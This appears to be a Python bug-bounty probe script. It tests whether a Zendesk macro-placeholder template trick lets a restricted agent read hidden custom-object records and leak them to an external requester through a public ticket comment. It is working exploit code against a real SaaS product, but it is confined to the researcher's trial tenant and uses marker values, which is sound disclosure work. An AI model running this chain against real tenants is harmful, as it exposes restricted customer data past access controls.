#!/usr/bin/env python3
"""
zd5_chain.py — ZD-5 chain test: does the macro-placeholder read bypass
escalate into disclosure OUTSIDE the agent boundary?

Filed report 169f1cb9 was closed Not Applicable (2026-11-09) with the
rationale "no security impact" and an explicit invitation: chain the
finding further / submit a new report if it can be exploited to reach
real impact. This run tests exactly one chain, end to end, in our own
trial tenant:

  1. A restricted record (custom object type moka_probe, LOW has No
     access: direct GET 403, UI-invisible) carries two fresh markers.
  2. A ticket whose REQUESTER is an external end user E is linked to
     the record via the lookup field and assigned to LOW.
  3. LOW renders the record's values via macro apply-preview (the
     already-filed bypass; re-proven here on the fresh record).
  4. LOW posts the rendered values as a PUBLIC comment on E's ticket
     (ordinary agent public-reply function — no triggers, no webhooks,
     no automations involved).
  5. Admin confirms the public comment (authored by LOW, public=true)
     carries the markers.

If steps 3-5 land, the restricted data has crossed from "an agent sees
what the tenant's RBAC hides" to "delivered to the external requester
through Zendesk's own requester-notification path" (the mailbox leg is
verified separately by the operator; this script prints the ticket id
and marker fingerprints so the notification mail can be matched).

Verdict lines (stdout; marker VALUES only in artifact files):
  CHAIN-READ:    RENDERED | HELD | INCONCLUSIVE
  CHAIN-POST:    POSTED | REFUSED | SKIPPED
  CHAIN-CONFIRM: CONFIRMED | ABSENT | SKIPPED

Plumbing imported from zd_battery (zb). No traffic without --run.
Exit: 0 = ran to verdict | 2 = refused/precondition | 3 = shape stop.
"""

import argparse
import hashlib
import json
import os
import sys
import time
import urllib.parse
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import zd_battery as zb  # noqa: E402

LOOKUP_TITLE = "moka zd5 link"
FIELD_KEY = "marker_field"
REQUESTER_EMAIL = "mimi05741b+zd5chain@bugcrowdninja.com"
REQUESTER_NAME = "ZD5 Chain Requester"


def fp(value):
    return hashlib.sha256(str(value).encode()).hexdigest()[:12]


def compound_body(lookup_id):
    name = "{{ticket.ticket_field_%s.name}}" % lookup_id
    field = ("{{ticket.ticket_field_%s.custom_fields.%s}}"
             % (lookup_id, FIELD_KEY))
    rid = "{{ticket.ticket_field_%s.id}}" % lookup_id
    return f"NAME={name} | FIELD={field} | ID={rid}"


def extract_apply_body(parsed):
    try:
        body = parsed["result"]["ticket"]["comment"]["body"]
    except (TypeError, KeyError, AttributeError):
        return ""
    return body if isinstance(body, str) else ""


class Run:
    def __init__(self):
        root = Path(os.environ.get("ZD5C_OUT", "outputs")) / "zd5c"
        self.id = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
        self.dir = root / self.id
        self.dir.mkdir(parents=True, exist_ok=True)
        self.manifest = {"probe": "ZD-5-CHAIN", "run_id": self.id,
                         "created": [], "notes": []}
        self.flush()

    def add(self, kind, ident, extra=None):
        self.manifest["created"].append(
            {"kind": kind, "id": ident, **(extra or {})})
        self.flush()

    def note(self, text):
        self.manifest["notes"].append(text)
        self.flush()

    def flush(self):
        (self.dir / "manifest.json").write_text(
            json.dumps(self.manifest, indent=2, ensure_ascii=False))

    def write_verdict(self, payload, lines):
        (self.dir / "verdict.json").write_text(
            json.dumps(payload, indent=2, ensure_ascii=False))
        (self.dir / "summary.txt").write_text("\n".join(lines) + "\n")
        for line in lines:
            print(line)


def run_probe():
    subdomain = os.environ.get("ZENDESK_SUBDOMAIN", "")
    low_email = os.environ.get("ZENDESK_EMAIL_LOW", "")
    if not subdomain or not low_email:
        zb.die_refuse("ZENDESK_SUBDOMAIN / ZENDESK_EMAIL_LOW unset. "
                      "No traffic sent.")
    obj_key = "moka_probe"

    run = Run()
    token = zb.bootstrap_token(subdomain, run.dir)
    client = zb.Client(subdomain, f"Bearer {token}", run.dir)
    low = zb.low_client(subdomain, run)

    marker_a = zb.marker("ZD5CHAINNAME")
    marker_b = zb.marker("ZD5CHAINFIELD")
    run.manifest["markers"] = {"name": marker_a, "field": marker_b}
    run.flush()
    print(f"ZD5C run_id={run.id} dir={run.dir}")
    print(f"ZD5C markers: NAME fp={fp(marker_a)} FIELD fp={fp(marker_b)}")

    def finish(payload, lines, code=0):
        run.write_verdict(payload, lines)
        return code

    def inconclusive(reasons, extra=None):
        payload = {"probe": "ZD-5-CHAIN", "run_id": run.id,
                   "overall": "INCONCLUSIVE", "reasons": reasons,
                   **(extra or {})}
        lines = ["VERDICT ZD-5-CHAIN: INCONCLUSIVE"] + \
            [f"  - {r}" for r in reasons]
        return finish(payload, lines)

    # --- fixtures (admin) -------------------------------------------
    st, parsed, _ = client.call("zd5c-create-record", "POST",
        f"/custom_objects/{obj_key}/records.json", {
            "custom_object_record": {
                "name": marker_a,
                "custom_object_fields": {FIELD_KEY: marker_b}}})
    record = ((parsed or {}).get("custom_object_record") or {})
    rec_id = record.get("id")
    if st == 422 or not rec_id:
        print("SHAPE-MISMATCH on record create — inspect saved body.")
        return 3
    rec_id = str(rec_id)
    run.add("custom_object_record", rec_id, {"object": obj_key})

    st, parsed, _ = client.call("zd5c-list-ticket-fields", "GET",
                                "/ticket_fields.json")
    lookup_id = None
    for f in ((parsed or {}).get("ticket_fields") or []):
        if f.get("title") == LOOKUP_TITLE:
            lookup_id = f.get("id")
    if not lookup_id:
        return inconclusive(["lookup field not found; run3 fixture "
                             "missing. Not HELD."])

    # LOW identity.
    st, parsed, _ = client.call(
        "zd5c-find-low", "GET",
        "/users/search.json?query=" +
        urllib.parse.quote(low_email, safe=""))
    users = (parsed or {}).get("users") or []
    if not users:
        return inconclusive(["LOW agent not found. Not HELD."])
    low_id = users[0].get("id")

    # End user E (create-or-find).
    st, parsed, _ = client.call("zd5c-create-requester", "POST",
                                "/users.json", {
        "user": {"name": REQUESTER_NAME, "email": REQUESTER_EMAIL,
                 "role": "end-user"}})
    e_user = ((parsed or {}).get("user") or {})
    e_id = e_user.get("id")
    if not e_id:
        st, parsed, _ = client.call(
            "zd5c-find-requester", "GET",
            "/users/search.json?query=" +
            urllib.parse.quote(REQUESTER_EMAIL, safe=""))
        us = (parsed or {}).get("users") or []
        e_id = us[0].get("id") if us else None
    if not e_id:
        return inconclusive(["requester creation failed; see bodies"])
    run.add("user", e_id, {"role": "end-user"})
    print(f"ZD5C requester id={e_id}")

    # Macro (compound body, same as run3).
    body_text = compound_body(lookup_id)
    st, parsed, _ = client.call("zd5c-create-macro", "POST",
                                "/macros.json", {
        "macro": {"title": "moka zd5 chain macro", "active": True,
                  "actions": [{"field": "comment_value",
                               "value": body_text}]}})
    macro_id = ((parsed or {}).get("macro") or {}).get("id")
    if not macro_id:
        return inconclusive([f"macro creation failed status={st}"])
    run.add("macro", macro_id)

    def linked_ticket(tag, assignee=None, requester=None):
        body = {"ticket": {
            "subject": f"moka zd5chain {tag}", "tags": [tag],
            "comment": {"body": "zd5 chain probe ticket",
                        "public": True},
            "custom_fields": [{"id": lookup_id, "value": rec_id}]}}
        if assignee:
            body["ticket"]["assignee_id"] = assignee
        if requester:
            body["ticket"]["requester_id"] = requester
        st, parsed, _ = client.call(f"zd5c-ticket-{tag}", "POST",
                                    "/tickets.json", body)
        tid = ((parsed or {}).get("ticket") or {}).get("id")
        if tid:
            run.add("ticket", tid)
        return tid

    # --- restriction proof ------------------------------------------
    st_get, _, raw = low.call("zd5c-low-get-record", "GET",
        f"/custom_objects/{obj_key}/records/{rec_id}.json")
    raw_text = raw.decode("utf-8", "replace") if raw else ""
    if st_get == 200 and (marker_a in raw_text or marker_b in raw_text):
        return inconclusive([
            "SETUP INVALID: LOW reads the record directly."])
    print(f"ZD5C restriction: LOW GET record status={st_get}")

    # --- control render (admin) --------------------------------------
    t_admin = linked_ticket("moka_zd5c_control")
    if not t_admin:
        return inconclusive(["control ticket creation failed"])
    st, parsed, raw = client.call(
        "zd5c-apply-control", "GET",
        f"/macros/{macro_id}/apply.json?ticket_id={t_admin}")
    control_text = extract_apply_body(parsed) or (
        raw.decode("utf-8", "replace") if raw else "")
    control_ok = marker_a in control_text and marker_b in control_text
    print(f"ZD5C control render: {'OK' if control_ok else 'MISSING'} "
          f"(apply status={st})")
    if not control_ok:
        return inconclusive([
            "Control leg did not render both markers: plumbing "
            "unproven. Do NOT read the test leg as HELD."])

    # --- test render (LOW) -------------------------------------------
    t_test = linked_ticket("moka_zd5c_test", assignee=low_id,
                           requester=e_id)
    if not t_test:
        return inconclusive(["test ticket creation failed"])
    print(f"ZD5C test ticket id={t_test}")
    run.manifest["test_ticket"] = t_test
    run.flush()
    st, parsed, raw = low.call(
        "zd5c-apply-test", "GET",
        f"/macros/{macro_id}/apply.json?ticket_id={t_test}")
    test_text = extract_apply_body(parsed) or (
        raw.decode("utf-8", "replace") if raw else "")
    read_ok = marker_a in test_text and marker_b in test_text
    print(f"ZD5C test render: {'RENDERED' if read_ok else 'no'} "
          f"(apply status={st})")
    chain_read = "RENDERED" if read_ok else "HELD"

    # --- disclosure post (LOW, public comment) ------------------------
    chain_post, chain_confirm = "SKIPPED", "SKIPPED"
    post_status = None
    if read_ok:
        disclosure = (
            "Following up on your request — the linked record details "
            f"are: {test_text}")
        st, parsed, raw = low.call("zd5c-low-public-post", "PUT",
            f"/tickets/{t_test}.json", {
                "ticket": {"comment": {"body": disclosure,
                                       "public": True}}})
        post_status = st
        print(f"ZD5C public post status={st}")
        chain_post = "POSTED" if st == 200 else "REFUSED"
        if st == 200:
            # Admin confirm: a public comment by LOW carries markers.
            st2, parsed2, raw2 = client.call(
                "zd5c-admin-comments", "GET",
                f"/tickets/{t_test}/comments.json")
            ctext = raw2.decode("utf-8", "replace") if raw2 else ""
            comments = ((parsed2 or {}).get("comments") or [])
            hit = any(
                c.get("public") and c.get("author_id") == low_id
                and marker_a in (c.get("body") or "")
                and marker_b in (c.get("body") or "")
                for c in comments)
            chain_confirm = "CONFIRMED" if hit else "ABSENT"
            print(f"ZD5C admin confirm: {chain_confirm} "
                  f"(comments status={st2}, raw-marker="
                  f"{marker_a in ctext and marker_b in ctext})")

    overall = ("CHAIN-LANDED" if chain_read == "RENDERED"
               and chain_post == "POSTED"
               and chain_confirm == "CONFIRMED"
               else "CHAIN-INCOMPLETE")
    payload = {"probe": "ZD-5-CHAIN", "run_id": run.id,
               "record_id": rec_id, "test_ticket": t_test,
               "requester_id": e_id,
               "markers": {"name": marker_a, "field": marker_b},
               "chain_read": chain_read, "chain_post": chain_post,
               "post_status": post_status,
               "chain_confirm": chain_confirm, "overall": overall}
    lines = [f"VERDICT ZD-5-CHAIN: {overall}",
             f"  - CHAIN-READ: {chain_read}",
             f"  - CHAIN-POST: {chain_post} (status={post_status})",
             f"  - CHAIN-CONFIRM: {chain_confirm}",
             f"  - test ticket id={t_test} (mailbox leg: search the "
             f"requester mailbox for the marker values in "
             f"verdict.json)"]
    return finish(payload, lines)


def selftest():
    results = []

    def check(name, cond):
        results.append((name, bool(cond)))
        print(f"SELFTEST {name}: {'OK' if cond else 'FAIL'}")

    body = compound_body(4242)
    check("body-forms",
          "{{ticket.ticket_field_4242.name}}" in body
          and "{{ticket.ticket_field_4242.custom_fields.marker_field}}"
          in body and "{{ticket.ticket_field_4242.id}}" in body)
    check("body-singular", "ticket_fields_" not in body)
    sample = {"result": {"ticket": {"comment": {"body": "x"}}}}
    check("extract", extract_apply_body(sample) == "x"
          and extract_apply_body({}) == "")
    check("fp", len(fp("a")) == 12 and fp("a") != fp("b"))
    ok = sum(1 for _, v in results if v)
    print(f"SELFTEST: {ok}/{len(results)} ALL OK"
          if ok == len(results) else
          f"SELFTEST: {ok}/{len(results)} — FAILURES PRESENT")
    return 0 if ok == len(results) else 1


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--run", action="store_true")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()
    if args.selftest:
        return selftest()
    if args.run:
        return run_probe()
    zb.die_refuse("no mode selected: pass --run or --selftest.")
    return 2


if __name__ == "__main__":
    sys.exit(main())
